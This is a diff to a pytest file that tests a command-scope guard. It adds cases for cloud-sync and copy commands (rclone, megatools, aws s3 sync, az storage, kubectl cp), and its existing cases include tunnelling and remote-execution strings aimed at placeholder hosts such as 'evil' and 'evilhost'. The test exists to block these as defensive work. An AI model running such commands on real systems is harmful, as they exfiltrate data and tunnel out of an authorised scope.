@@ -648,7 +648,7 @@ class TestAssertCommandInScope:
             assert_command_in_scope(
                 "wstunnel client -L 1080:10.0.0.1:22 ws://evil", scope_env=scope
             )
-        with pytest.raises(PermissionDeniedError, match="rclone mount"):
+        with pytest.raises(PermissionDeniedError, match="rclone"):
             assert_command_in_scope("rclone mount remote: /mnt", scope_env=scope)
         # RH-45 — mesh VPN clients + ip tuntap
         with pytest.raises(PermissionDeniedError, match="zerotier-cli|Proxy/tunnel"):
@@ -772,6 +772,21 @@ class TestAssertCommandInScope:
             assert_command_in_scope("pssh -H evilhost uptime", scope_env=scope)
         with pytest.raises(PermissionDeniedError, match="evilhost"):
             assert_command_in_scope("sqlplus u/p@evilhost/orcl", scope_env=scope)
+        # RH-51 — opaque cloud sync / kubectl cp under scope
+        with pytest.raises(PermissionDeniedError, match="rclone"):
+            assert_command_in_scope("rclone copy /tmp remote:", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="megatools"):
+            assert_command_in_scope(
+                "megatools put --path /Root file", scope_env=scope
+            )
+        with pytest.raises(PermissionDeniedError, match="aws s3"):
+            assert_command_in_scope("aws s3 sync /tmp s3://bucket", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="az storage"):
+            assert_command_in_scope(
+                "az storage blob upload -f x", scope_env=scope
+            )
+        with pytest.raises(PermissionDeniedError, match=r"kubectl cp|\bcp\b"):
+            assert_command_in_scope("kubectl cp /tmp/x pod:/tmp/x", scope_env=scope)
         # RH-33: service-discovery / DB transport env pivots.
         with pytest.raises(PermissionDeniedError, match="CONSUL_HTTP_ADDR|Transport"):
             assert_command_in_scope(
